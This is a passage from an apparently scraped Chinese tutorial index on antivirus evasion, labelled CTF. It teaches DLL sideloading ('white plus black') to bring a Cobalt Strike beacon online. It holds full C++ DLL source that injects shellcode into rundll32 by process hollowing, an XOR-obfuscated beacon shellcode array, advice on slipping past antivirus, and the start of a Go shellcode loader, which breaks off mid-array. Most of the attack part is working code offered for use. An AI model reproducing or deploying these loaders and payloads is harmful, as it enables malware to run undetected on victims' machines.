GetProcAddress \u83b7\u53d6 \"Dll1.dll\" \u4e2d\u540d\u4e3a \"sum\" \u7684\u51fd\u6570\u5730\u5740\n  // GetProcAddress \u51fd\u6570\u8fd4\u56de\u51fd\u6570\u5730\u5740\uff0c\u5c06\u5176\u5f3a\u5236\u8f6c\u6362\u4e3a pSum \u7c7b\u578b\u7684\u51fd\u6570\u6307\u9488\n  pSum sum = (pSum)GetProcAddress(hDll1, \"sum\");\n\n  // \u8c03\u7528 \"sum\" \u51fd\u6570\uff0c\u5e76\u5c06\u7ed3\u679c\u8f93\u51fa\u5230\u63a7\u5236\u53f0\n  cout &lt;&lt; sum(1, 2) &lt;&lt; endl;\n\n  // main \u51fd\u6570\u7684\u8fd4\u56de\u503c\uff0c\u901a\u5e38\u8868\u793a\u7a0b\u5e8f\u6b63\u5e38\u7ec8\u6b62\n  return 0;\n}\n</code></pre> <p>\u8fd9\u6bb5\u4ee3\u7801\u7684\u4f5c\u7528\u662f\u901a\u8fc7\u52a8\u6001\u94fe\u63a5\u5e93\uff08DLL\uff09\u7684\u52a0\u8f7d\u548c\u51fd\u6570\u6307\u9488\u7684\u65b9\u5f0f\u52a0\u8f7d\u4e00\u4e2a\u540d\u4e3a Dll1.dll \u7684 DLL \u6587\u4ef6\uff0c\u5e76\u4ece\u4e2d\u83b7\u53d6\u4e00\u4e2a\u51fd\u6570 sum\uff0c\u7136\u540e\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570\u5e76\u8f93\u51fa\u7ed3\u679c\u3002</p> <p>1.<code>HMODULE hDll1 = LoadLibrary(L\"Dll1.dll\");</code>\uff1a\u8fd9\u4e00\u884c\u4ee3\u7801\u901a\u8fc7 LoadLibrary \u51fd\u6570\u52a0\u8f7d\u540d\u4e3a \"Dll1.dll\" \u7684\u52a8\u6001\u94fe\u63a5\u5e93\u3002 LoadLibrary \u51fd\u6570\u8fd4\u56de\u4e00\u4e2a\u6a21\u5757\u53e5\u67c4\uff08 HMODULE \u7c7b\u578b\uff09\uff0c\u8be5\u53e5\u67c4\u7528\u4e8e\u6807\u8bc6\u5df2\u52a0\u8f7d\u7684\u52a8\u6001\u94fe\u63a5\u5e93\u3002\u5982\u679c\u52a0\u8f7d\u5931\u8d25\uff0c hDll1 \u5c06\u4e3a NULL \u3002 2.<code>typedef int(*pSum)(int a, int b);</code>\uff1a\u8fd9\u4e00\u884c\u4ee3\u7801\u5b9a\u4e49\u4e86\u4e00\u4e2a\u51fd\u6570\u6307\u9488\u7c7b\u578b pSum \uff0c\u8be5\u6307\u9488\u6307\u5411\u4e00\u4e2a\u51fd\u6570\uff0c\u8be5\u51fd\u6570\u63a5\u53d7\u4e24\u4e2a int \u7c7b\u578b\u53c2\u6570\u5e76\u8fd4\u56de\u4e00\u4e2a int \u7c7b\u578b\u7684\u503c\u3002\u8fd9\u4e2a\u7c7b\u578b\u5b9a\u4e49\u7528\u4e8e\u540e\u7eed\u5c06\u52a8\u6001\u94fe\u63a5\u5e93\u4e2d\u7684\u51fd\u6570\u5730\u5740\u8d4b\u7ed9\u4e00\u4e2a\u51fd\u6570\u6307\u9488\u3002 3.<code>pSum sum = (pSum)GetProcAddress(hDll1, \"sum\");</code>\uff1a GetProcAddress \u51fd\u6570\u7528\u4e8e\u83b7\u53d6\u52a8\u6001\u94fe\u63a5\u5e93\u4e2d\u5177\u6709\u6307\u5b9a\u540d\u79f0\u7684\u51fd\u6570\u7684\u5730\u5740\u3002\u8fd9\u91cc\uff0c\u5b83\u4ece hDll1 \u4e2d\u83b7\u53d6\u540d\u4e3a \"sum\" \u7684\u51fd\u6570\u7684\u5730\u5740\uff0c\u5e76\u5c06\u5176\u8d4b\u7ed9 sum \u51fd\u6570\u6307\u9488\u3002 4. <code>cout &lt;&lt; sum(1,2) &lt;&lt; endl;</code>\uff1a\u901a\u8fc7\u8c03\u7528 sum \u51fd\u6570\u6307\u9488\u6765\u6267\u884c\u52a8\u6001\u94fe\u63a5\u5e93\u4e2d\u7684 \"sum\" \u51fd\u6570\uff0c\u4f20\u9012\u53c2\u6570 1 \u548c 2\uff0c\u5e76\u5c06\u7ed3\u679c\u8f93\u51fa\u5230\u63a7\u5236\u53f0</p> <p>\u6ce8\u610f\uff0c\u8fd9\u65f6\u8fd8\u4e0d\u80fd\u76f4\u63a5\u70b9\u51fb\u8fd0\u884c exe\uff0c\u9700\u8981\u53f3\u952e dlltest \u9009\u62e9\u3010\u8bbe\u4e3a\u542f\u52a8\u9879\u76ee\u3011</p> <p></p> <p>\u70b9\u51fb\u751f\u6210\u89e3\u51b3\u65b9\u6848\u5373\u53ef</p> <p></p> <p></p> <p></p> <p>\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6bcf\u6b21 dll \u4fee\u6539\u540e\uff08\u5305\u62ec\u6253\u65ad\u70b9\uff09\u90fd\u8981\u53f3\u952e dll \u9879\u76ee\u91cd\u65b0\u751f\u6210\uff0c\u4e0d\u7136 exe \u8c03\u7528\u7684 dll \u8fd8\u662f\u65e7\u7684 dll\u3002</p> <p>\u6211\u4eec\u6253\u4e2a\u65ad\u70b9\u8bd5\u8bd5\uff1a</p> <p></p> <p></p> <p></p> <p>\u8fd9\u91cc\u5bf9 dll \u7684\u8c03\u8bd5\u5c31\u5b8c\u6210\u4e86</p>"},{"location":"CTF/Antimalware_evasion/AV/Article8/index.html#7cs","title":"7.\u5236\u4f5c\u767d\u52a0\u9ed1\u4e0a\u7ebfcs","text":"<p>\u77e5\u9053\u4e86dll\u6587\u4ef6\u662f\u600e\u4e48\u4e2a\u4e8b, \u90a3\u4e48\u63a5\u4e0b\u6765\u6211\u4eec\u5c31\u53ef\u4ee5\u8fdb\u884c\u767d\u52a0\u9ed1\u7684\u6316\u6398\u4e86, \u624b\u5de5\u6316\u867d\u7136\u53ef\u4ee5, \u4f46\u662f\u6548\u7387\u592a\u4f4e, \u63a8\u8350\u4f7f\u7528\u5de5\u5177\u6279\u91cf\u6316\u6398</p>"},{"location":"CTF/Antimalware_evasion/AV/Article8/index.html#skyshadow","title":"SkyShadow","text":"<p>\u628a SkyShadow-main\\Tools \u76ee\u5f55\u6dfb\u52a0\u5230\u73af\u5883\u53d8\u91cf</p> <p></p> <p>\u8fd0\u884c</p> <pre><code>python3 SkyShadow.py \"\u6587\u4ef6\u5939\u8def\u5f84\"\n# \u6587\u4ef6\u8def\u5f84\u9009\u62e9\u4f60\u7535\u8111\u4e0a\u8f6f\u4ef6\u7684\u5e38\u89c1\u5b89\u88c5\u76ee\u5f55,\u6bd4\u5982\nC:\\Program Files\nC:\\Program Files (x86)\n</code></pre> <p>\u8fd9\u91cc\u7ed9\u5927\u5bb6\u6f14\u793a, \u9009\u62e9</p> <pre><code>SkyShadow-main\\test\npython3 SkyShadow.py \"test\"\n</code></pre> <p>\u4f1a\u751f\u6210\u4e00\u4e2apayload\u76ee\u5f55</p> <p></p> <p></p> <p>\u5176\u4e2d\u6807\u6709\u6570\u5b57\u7b7e\u540d\u7684\u662f\u6211\u4eec\u53ef\u80fd\u9700\u8981\u7684\u767d\u7a0b\u5e8f</p> <p></p> <p>\u53cc\u51fb\u8fd0\u884cexe, \u5982\u679c\u63d0\u793a\u53ea\u7f3a\u5c11\u4e00\u4e2adll\u6587\u4ef6(\u591a\u4e2a\u5c31\u8981\u5199\u591a\u4e2adll\u6587\u4ef6\u4e86, \u610f\u4e49\u4e0d\u5927), \u5373\u53ef</p> <p></p> <p>\u7136\u540e\u6253\u5f00txt, \u6839\u636e\u63d0\u793a\u5236\u4f5cdll\u6587\u4ef6</p> <p></p> <p>\u5236\u4f5cdll\u6587\u4ef6\u6d4b\u8bd5, \u54ea\u4e9b\u5bfc\u51fa\u51fd\u6570\u4f1a\u88ab\u8c03\u7528\u3002\u76f4\u63a5\u628a\u5bfc\u51fa\u51fd\u6570\u7684\u5b9a\u4e49\u653e\u5728dllmain.cpp\u6587\u4ef6\u5373\u53ef</p> <p></p> <p>\u7f16\u8bd1\u751f\u6210, \u91cd\u547d\u540d, \u8ddfexe\u653e\u5728\u540c\u4e00\u4e2a\u76ee\u5f55</p> <p></p> <p></p> <p></p> <p>\u4e24\u4e2a\u5bfc\u51fa\u51fd\u6570, \u5747\u88ab\u8c03\u7528, \u90a3\u4e48shellcode\u52a0\u8f7d\u5668\u5199\u5728\u4efb\u610f\u4e00\u4e2a\u51fd\u6570\u5747\u53ef, \u53e6\u5916\u4e00\u4e2a\u53ef\u4ee5\u76f4\u63a5return</p>"},{"location":"CTF/Antimalware_evasion/AV/Article8/index.html#_1","title":"\u52a0\u8f7d\u6267\u884c\u8ba1\u7b97\u5668","text":"<pre><code>// dllmain.cpp : \u5b9a\u4e49 DLL \u5e94\u7528\u7a0b\u5e8f\u7684\u5165\u53e3\u70b9\u3002\n#include \"pch.h\"\n#include &lt;iostream&gt;\nusing namespace std;\nunsigned char payload[] = {\n0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,\n0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,\n0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59\n,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,\n0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,\n0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x00 };\nunsigned int payload_len = sizeof payload - 1;\nextern \"C\" __declspec(dllexport) int GetInstallDetailsPayload() {\n  char* v7A = (char*)VirtualAlloc(0, payload_len, 0x3000u, 0x40u);\n  memcpy((void*)v7A, payload, payload_len);\n  struct _PROCESS_INFORMATION ProcessInformation;\n  struct _STARTUPINFOA StartupInfo;\n  void* v24;\n  CONTEXT Context;\n  memset(&amp;StartupInfo, 0, sizeof(StartupInfo));\n  StartupInfo.cb = 68;\n  BOOL result = CreateProcessA(0, (LPSTR)\"rundll32.exe\", 0, 0, 0, 0x44u, 0, 0, &amp;StartupInfo,\n    &amp;ProcessInformation);\n  if (result)\n  {\n    Context.ContextFlags = 65539;\n    GetThreadContext(ProcessInformation.hThread, &amp;Context);\n    v24 = VirtualAllocEx(ProcessInformation.hProcess, 0, payload_len, 0x1000u, 0x40u);\n    WriteProcessMemory(ProcessInformation.hProcess, v24, v7A, payload_len, NULL);\n    // 32 \u4f4d\u4f7f\u7528 Context.Eip = (DWORD_PTR)v24;\n    Context.Rip = (DWORD_PTR)v24;\n    SetThreadContext(ProcessInformation.hThread, &amp;Context);\n    ResumeThread(ProcessInformation.hThread);\n    CloseHandle(ProcessInformation.hThread);\n    result = CloseHandle(ProcessInformation.hProcess);\n  }\n  TerminateProcess(GetCurrentProcess(), 0);\n  return 0;\n}\nextern \"C\" __declspec(dllexport) int SignalInitializeCrashReporting() {\n  return 0;\n}\nBOOL APIENTRY DllMain(HMODULE hModule,\n  DWORD ul_reason_for_call,\n  LPVOID lpReserved\n)\n{\n  switch (ul_reason_for_call)\n  {\n  case DLL_PROCESS_ATTACH:\n  case DLL_THREAD_ATTACH:\n  case DLL_THREAD_DETACH:\n  case DLL_PROCESS_DETACH:\n    break;\n  }\n  return TRUE;\n}\n</code></pre> <p>\u5269\u4e0b\u7684\u5c31\u662f\u66ff\u6362shellcode\u4e3a\u4e0a\u7ebfcs, \u4ee5\u53cashellcode\u7684\u5904\u7406</p>"},{"location":"CTF/Antimalware_evasion/AV/Article8/index.html#shellcode-cs","title":"\u5f02\u6216\u52a0\u5bc6shellcode, \u4e0a\u7ebfcs","text":"<pre><code>// dllmain.cpp : \u5b9a\u4e49 DLL \u5e94\u7528\u7a0b\u5e8f\u7684\u5165\u53e3\u70b9\u3002\n#include \"pch.h\"\n#include &lt;iostream&gt;\nusing namespace std;\n// sc\u8ddf20\u5f02\u6216\u4e86\nunsigned char payload[] = { 0xe8,0x5c,0x97,0xf0,0xe4,0xfc,0xdc,0x14,0x14,0x14,0x55,0x45,0x55,0x44,0x46,0x45,0x42,0x5c,0x25,0xc6,0x71,0x5c,0x9f,0x46,0x74,0x5c,0x9f,0x46,0x0c,0x5c,0x9f,0x46,0x34,0x5c,0x9f,0x66,0x44,0x5c,0x1b,0xa3,0x5e,0x5e,0x59,0x25,0xdd,0x5c,0x25,0xd4,0xb8,0x28,0x75,0x68,0x16,0x38,0x34,0x55,0xd5,0xdd,0x19,0x55,0x15,0xd5,0xf6,0xf9,0x46,0x55,0x45,0x5c,0x9f,0x46,0x34,0x9f,0x56,0x28,0x5c,0x15,0xc4,0x72,0x95,0x6c,0x0c,0x1f,0x16,0x61,0x66,0x9f,0x94,0x9c,0x14,0x14,0x14,0x5c,0x91,0xd4,0x60,0x73,0x5c,0x15,0xc4,0x44,0x9f,0x5c,0x0c,0x50,0x9f,0x54,0x34,0x5d,0x15,0xc4,0xf7,0x42,0x5c,0xeb,0xdd,0x55,0x9f,0x20,0x9c,0x5c,0x15,0xc2,0x59,0x25,0xdd,0x5c,0x25,0xd4,0xb8,0x55,0xd5,0xdd,0x19,0x55,0x15,0xd5,0x2c,0xf4,0x61,0xe5,0x58,0x17,0x58,0x30,0x1c,0x51,0x2d,0xc5,0x61,0xcc,0x4c,0x50,0x9f,0x54,0x30,0x5d,0x15,0xc4,0x72,0x55,0x9f,0x18,0x5c,0x50,0x9f,0x54,0x08,0x5d,0x15,0xc4,0x55,0x9f,0x10,0x9c,0x5c,0x15,0xc4,0x55,0x4c,0x55,0x4c,0x4a,0x4d,0x4e,0x55,0x4c,0x55,0x4d,0x55,0x4e,0x5c,0x97,0xf8,0x34,0x55,0x46,0xeb,0xf4,0x4c,0x55,0x4d,0x4e,0x5c,0x9f,0x06,0xfd,0x5b,0xeb,0xeb,0xeb,0x49,0x7e,0x14,0x5d,0xaa,0x63,0x7d,0x7a,0x7d,0x7a,0x71,0x60,0x14,0x55,0x42,0x5d,0x9d,0xf2,0x58,0x9d,0xe5,0x55,0xae,0x58,0x63,0x32,0x13,0xeb,0xc1,0x5c,0x25,0xdd,0x5c,0x25,0xc6,0x59,0x25,0xd4,0x59,0x25,0xdd,0x55,0x44,0x55,0x44,0x55,0xae,0x2e,0x42,0x6d,0xb3,0xeb,0xc1,0xff,0x67,0x4e,0x5c,0x9d,0xd5,0x55,0xac,0xc6,0x10,0x14,0x14,0x59,0x25,0xdd,0x55,0x45,0x55,0x45,0x7e,0x17,0x55,0x45,0x55,0xae,0x43,0x9d,0x8b,0xd2,0xeb,0xc1,0xff,0x4d,0x4f,0x5c,0x9d,0xd5,0x5c,0x25,0xc6,0x5d,0x9d,0xcc,0x59,0x25,0xdd,0x46,0x7c,0x14,0x16,0x54,0x90,0x46,0x46,0x55,0xae,0xff,0x41,0x3a,0x2f,0xeb,0xc1,0x5c,0x9d,0xd2,0x5c,0x97,0xd7,0x44,0x7e,0x1e,0x4b,0x5c,0x9d,0xe5,0x5c,0x9d,0xce,0x5d,0xd3,0xd4,0xeb,0xeb,0xeb,0xeb,0x59,0x25,0xdd,0x46,0x46,0x55,0xae,0x39,0x12,0x0c,0x6f,0xeb,0xc1,0x91,0xd4,0x1b,0x91,0x89,0x15,0x14,0x14,0x5c,0xeb,0xdb,0x1b,0x90,0x98,0x15,0x14,0x14,0xff,0xc7,0xfd,0xf0,0x15,0x14,0x14,0xfc,0xb6,0xeb,0xeb,0xeb,0x3b,0x58,0x5c,0x40,0x61,0x14,0x66,0x1e,0xf4,0x82,0x72,0x26,0xee,0x5e,0x45,0x4a,0xcd,0xf5,0xab,0x50,0xf5,0x93,0x58,0xb3,0xae,0xfb,0x89,0x97,0x24,0x84,0x5f,0xca,0x20,0xb3,0xf2,0xcb,0x14,0xb0,0x9a,0xed,0xde,0x04,0x09,0x34,0xa9,0xb6,0x19,0x76,0x73,0x2e,0x29,0x82,0x63,0x39,0xde,0xe7,0x0d,0x1f,0xb1,0x1d,0xa7,0xaf,0x26,0x07,0x18,0x00,0xb5,0x16,0x2b,0x45,0x21,0x1d,0x7b,0x03,0xf6,0x14,0xe5,0xdd,0x85,0x14,0x41,0x67,0x71,0x66,0x39,0x55,0x73,0x71,0x7a,0x60,0x2e,0x34,0x59,0x7b,0x6e,0x7d,0x78,0x78,0x75,0x3b,0x21,0x3a,0x24,0x34,0x3c,0x77,0x7b,0x79,0x64,0x75,0x60,0x7d,0x76,0x78,0x71,0x2f,0x34,0x59,0x47,0x5d,0x51,0x34,0x2d,0x3a,0x24,0x2f,0x34,0x43,0x7d,0x7a,0x70,0x7b,0x63,0x67,0x34,0x5a,0x40,0x34,0x22,0x3a,0x25,0x2f,0x34,0x40,0x66,0x7d,0x70,0x71,0x7a,0x60,0x3b,0x21,0x3a,0x24,0x2f,0x34,0x41,0x5c,0x47,0x3d,0x19,0x1e,0x14,0xb8,0x62,0x02,0x7f,0x2f,0x40,0x69,0xde,0x3b,0xd7,0xc2,0xea,0xd4,0xcb,0x01,0xbb,0x67,0xb0,0xac,0xbc,0x6f,0xc2,0x30,0x38,0x30,0x75,0x42,0x9f,0x72,0x85,0x8d,0x9a,0x30,0xf6,0xbc,0xbb,0xc4,0x8d,0x9e,0x56,0xd3,0x2a,0x8a,0xc0,0xd0,0xab,0xb1,0x90,0xbb,0x97,0x6b,0xaf,0x64,0x03,0x80,0x0f,0xcf,0x17,0xc7,0x94,0x1a,0xdd,0xe9,0xd8,0xd8,0xda,0xd6,0x68,0xd0,0x50,0x12,0x47,0x62,0x8a,0x60,0xa2,0x73,0x2f,0x7f,0xb2,0xf2,0xaa,0x83,0x41,0xdd,0x16,0x56,0x08,0xde,0x93,0x4f,0xd8,0x02,0x0b,0xa9,0x90,0xce,0xbe,0x52,0x0c,0x90,0x45,0x41,0xf7,0xbf,0x12,0xbd,0xb2,0x0d,0x3d,0x02,0x0f,0x50,0xad,0xd6,0x1d,0xfb,0x1a,0xd5,0xe3,0xaa,0xba,0xf2,0xdb,0x93,0xd4,0x13,0x93,0x58,0x89,0x04,0x1e,0x58,0x32,0x50,0x51,0x56,0x7f,0xa5,0x80,0x26,0xae,0xd1,0x73,0xe1,0x2e,0x84,0x71,0xf4,0xa8,0x56,0xdc,0x84,0xfe,0x3d,0xcc,0x26,0x68,0x2c,0xc8,0x88,0xe4,0xd3,0x64,0x75,0x61,0x4c,0x92,0x12,0x08,0x8f,0xb1,0x0f,0x03,0x49,0x87,0xcb,0xf9,0x43,0x27,0x5d,0xb5,0x95,0xe6,0x23,0x41,0xf8,0x9d,0xae,0x76,0x37,0x99,0x6c,0xef,0x00,0x16,0x8f,0x2c,0x6a,0xc7,0xcc,0x6d,0xe5,0xfa,0x4e,0x43,0x5a,0x17,0xf3,0xec,0x32,0x19,0x85,0x35,0x5e,0x5d,0x1e,0x92,0x16,0x52,0x14,0x55,0xaa,0xe4,0xa1,0xb6,0x42,0xeb,0xc1,0x5c,0x25,0xdd,0xae,0x14,0x14,0x54,0x14,0x55,0xac,0x14,0x04,0x14,0x14,0x55,0xad,0x54,0x14,0x14,0x14,0x55,0xae,0x4c,0xb0,0x47,0xf1,0xeb,0xc1,0x5c,0x87,0x47,0x47,0x5c,0x9d,0xf3,0x5c,0x9d,0xe5,0x5c,0x9d,0xce,0x55,0xac,0x14,0x34,0x14,0x14,0x5d,0x9d,0xed,0x55,0xae,0x06,0x82,0x9d,0xf6,0xeb,0xc1,0x5c,0x97,0xd0,0x34,0x91,0xd4,0x60,0xa2,0x72,0x9f,0x13,0x5c,0x15,0xd7,0x91,0xd4,0x61,0xc3,0x4c,0x4c,0x4c,0x5c,0x11,0x14,0x14,0x14,0x14,0x44,0xd7,0xfc,0x8b,0xe9,0xeb,0xeb,0x2c,0x3a,0x25,0x27,0x24,0x3a,0x27,0x21,0x3a,0x25,0x27,0x27,0x14,0x06,0x20,0x42,0x6c };\nunsigned int payload_len = sizeof payload - 1;\nvoid myXor(unsigned char str[], int len, int key) {\n  for (int i = 0; i &lt; len; i++) {\n    str[i] = str[i] ^ key;\n  }\n}\nextern \"C\" __declspec(dllexport) int GetInstallDetailsPayload() {\n  HMODULE hModule = GetModuleHandleA(\"kernel32.dll\");\n  if (hModule == NULL)\n  {\n    cout &lt;&lt; \"GetModuleHandle failed.\" &lt;&lt; endl;\n    return -1;\n  }\n  char szPath[MAX_PATH];\n  DWORD dwSize = GetModuleFileNameA(hModule, szPath, MAX_PATH);\n  if (dwSize == 0)\n  {\n    cout &lt;&lt; \"GetModuleFileName failed.\" &lt;&lt; endl;\n    return -1;\n  }\n  myXor(payload, payload_len, szPath[strlen(szPath) - 3] - '0'); // szPath[strlen(szPath) - 3] - '0' -&gt;20\n    char* v7A = (char*)VirtualAlloc(0, payload_len, 0x3000u, 0x40u);\n  memcpy((void*)v7A, payload, payload_len);\n  struct _PROCESS_INFORMATION ProcessInformation;\n  struct _STARTUPINFOA StartupInfo;\n  void* v24;\n  CONTEXT Context;\n  memset(&amp;StartupInfo, 0, sizeof(StartupInfo));\n  StartupInfo.cb = 68;\n  BOOL result = CreateProcessA(0, (LPSTR)\"rundll32.exe\", 0, 0, 0, 0x44u, 0, 0, &amp;StartupInfo,\n    &amp;ProcessInformation);\n  if (result)\n  {\n    Context.ContextFlags = 65539;\n    GetThreadContext(ProcessInformation.hThread, &amp;Context);\n    v24 = VirtualAllocEx(ProcessInformation.hProcess, 0, payload_len, 0x1000u, 0x40u);\n    WriteProcessMemory(ProcessInformation.hProcess, v24, v7A, payload_len, NULL);\n    // 32 \u4f4d\u4f7f\u7528 Context.Eip = (DWORD_PTR)v24;\n    Context.Rip = (DWORD_PTR)v24;\n    SetThreadContext(ProcessInformation.hThread, &amp;Context);\n    ResumeThread(ProcessInformation.hThread);\n    CloseHandle(ProcessInformation.hThread);\n    result = CloseHandle(ProcessInformation.hProcess);\n  }\n  TerminateProcess(GetCurrentProcess(), 0);\n  return 0;\n}\nextern \"C\" __declspec(dllexport) int SignalInitializeCrashReporting() {\n  return 0;\n}\nBOOL APIENTRY DllMain(HMODULE hModule,\n  DWORD ul_reason_for_call,\n  LPVOID lpReserved\n)\n{\n  switch (ul_reason_for_call)\n  {\n  case DLL_PROCESS_ATTACH:\n  case DLL_THREAD_ATTACH:\n  case DLL_THREAD_DETACH:\n  case DLL_PROCESS_DETACH:\n    break;\n  }\n  return TRUE;\n}\n</code></pre> <p>\u591a\u63d0\u4e00\u5634: \u5982\u679cdll\u88ab\u6740, \u5f88\u6b63\u5e38, \u56e0\u4e3a\u9ed1dll\u4f1a\u88ab\u67e5\u6740, \u6dfb\u52a0\u5bf9\u5e94\u767d\u540d\u5355\u7684exe\u6570\u5b57\u7b7e\u540d\u5373\u53ef, \u6709\u4e9b\u9ed1dll, \u53ea\u8981\u540d\u5b57\u662fxxxdll\u5c31\u4f1a\u88ab\u6740, \u8fd9\u662f\u76f4\u63a5\u52a0\u9ed1\u4e86, \u901a\u8fc7\u6587\u4ef6\u540d\u6740\u7684, \u4e0d\u7ba1\u4f60dll\u91cc\u9762\u662f\u4ec0\u4e48\u4ee3\u7801</p>"},{"location":"CTF/Antimalware_evasion/AV/Article8/index.html#8","title":"8.\u767d\u52a0\u9ed1\u73b0\u573a\u6316\u6398","text":"<p>1.\u5b89\u88c5\u4e00\u53f0\u865a\u62df\u673a 2.\u90e8\u7f72\u597dPython\u73af\u5883, \u4ee5\u53caSkyShadow\u811a\u672c 3.\u65b0\u521b\u5efa\u4e00\u4e2a\u76ee\u5f55, \u7528\u4e8e\u7a0b\u5e8f\u5b89\u88c5\u76ee\u5f55 4.\u62cd\u6444\u5feb\u7167 5.\u4e0b\u8f7d\u7ad9</p> <pre><code>https://pc.qq.com/category/c0.html\nhttps://lestore.lenovo.com/cate/soft?cid=13&amp;tid=30\n</code></pre> <p></p> <pre><code>https://lsw-fast.lenovo.com.cn/appstore/normal/apps/3709-2023-08-24105238-\n1692845558679.msi\n</code></pre> <p></p> <p></p> <p></p> <p></p>"},{"location":"CTF/Antimalware_evasion/AV/Article9/index.html","title":"1.\u52a0\u8f7d\u5668\u56de\u987e","text":"<p>\u8fd8\u8bb0\u5f97\u4e4b\u524d\u8bb2\u7684shellcode\u548c\u52a0\u8f7d\u5668\u5417?</p> <p>\u6211\u4eec\u7684shellcode\u65e0\u6cd5\u5355\u72ec\u8fd0\u884c, \u9700\u8981\u501f\u52a9\u52a0\u8f7d\u5668, \u800c\u52a0\u8f7d\u5668\u7684\u529f\u80fd\u5c31\u662f\u5e2e\u52a9shellcode\u8fd0\u884c\u8d77\u6765, shellcode\u60f3\u8981\u8fd0\u884c\u8d77\u6765\u5462, \u5c31\u9700\u8981\u6211\u4eec\u628a\u5b83\u653e\u5230\u5185\u5b58\u4e2d, \u7136\u540e\u901a\u8fc7\u67d0\u4e9b\u65b9\u5f0f\u8ba9\u5176\u8fd0\u884c, \u6240\u4ee5\u6211\u4eec\u52a0\u8f7d\u5668\u8981\u5b9e\u73b0\u7684\u4ee3\u7801\u5c31\u662f:</p> <ul> <li>\u7533\u8bf7\u5185\u5b58</li> <li>\u590d\u5236shellcode\u5230\u5f00\u8f9f\u7684\u5185\u5b58\u4e2d</li> <li>\u901a\u8fc7\u67d0\u4e9b\u65b9\u5f0f\u8fd0\u884cshellcode</li> </ul>"},{"location":"CTF/Antimalware_evasion/AV/Article9/index.html#2gowindows-api","title":"2.go\u8bed\u8a00\u8c03\u7528Windows api","text":"<p>\u800c\u5173\u4e8e\u5185\u5b58\u7684\u4e00\u4e9b\u64cd\u4f5c\u9700\u8981\u501f\u52a9Windows api, \u6240\u4ee5\u6211\u4eec\u8981\u60f3\u4f7f\u7528go\u8bed\u8a00\u7f16\u5199\u52a0\u8f7d\u5668.\u7b2c\u4e00\u4e2a\u8981\u89e3\u51b3\u7684\u95ee\u9898\u5c31\u662f\u5982\u4f55\u4f7f\u7528go\u8bed\u8a00\u8c03\u7528Windows api.</p>"},{"location":"CTF/Antimalware_evasion/AV/Article9/index.html#21syscall","title":"2.1syscall\u5305","text":"<p>syscall\u5305\uff0c\u63d0\u4f9b\u4e86\u4e0e\u64cd\u4f5c\u7cfb\u7edf\u8fdb\u884c\u4ea4\u4e92\u7684\u5e95\u5c42\u51fd\u6570\uff0c\u5373\u6211\u4eec\u9700\u8981\u7684\u90a3\u4e9bWindows API\u3002\u56e0\u4e3a\u662f\u5185\u7f6e\u7684\uff0c\u76f4\u63a5\u5bfc\u5165\u5373\u53ef\u4f7f\u7528\uff0c\u4e0d\u9700\u8981\u4e0b\u8f7d\u3002</p> <pre><code>package  main\n\nimport \"syscall\"\n\nfunc main() {\n}\n</code></pre> <p>\u901a\u8fc7\u8c03\u7528Windows api\u7f16\u5199\u52a0\u8f7d\u5668\uff0c\u8fd0\u884ccalc\u7684shellcode</p> <pre><code>package main\n\nimport (\n    \"syscall\"\n    \"unsafe\"\n)\n\nfunc main() {\n    // 1.\u52a0\u8f7dkernel32.dll,MustLoadDLL\n    kernel32 := syscall.MustLoadDLL(\"kernel32.dll\")\n    // 2.\u83b7\u53d6windows api,MustFindProc\n    VirtualAlloc := kernel32.MustFindProc(\"VirtualAlloc\")\n    RtlMoveMemory := kernel32.MustFindProc(\"RtlMoveMemory\")\n    CreateThread := kernel32.MustFindProc(\"CreateThread\")\n    WaitForSingleObject := kernel32.MustFindProc(\"WaitForSingleObject\")\n    sc := []byte{0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50,\n        0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,\n        0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48,\n        0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 